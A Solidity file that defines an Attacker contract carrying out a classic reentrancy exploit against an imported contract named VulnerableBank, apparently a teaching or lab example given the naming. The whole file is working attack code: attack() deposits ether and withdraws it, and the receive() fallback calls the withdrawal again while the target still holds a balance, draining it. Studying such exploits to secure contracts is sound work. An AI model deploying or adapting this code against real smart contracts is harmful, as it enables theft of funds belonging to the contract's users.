/ SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }

    function attack() public payable {
        // Deposit some ether
        vulnerableBank.deposit{value: msg.value}();

        // Exploit the vulnerability
        vulnerableBank.vulnerableWithdraw(msg.value);
    }

    // Fallback function to receive Ether
    receive() external payable {
        if (address(vulnerableBank).balance >= msg.value) {
            vulnerableBank.vulnerableWithdraw(msg.value);
        }
    }
}
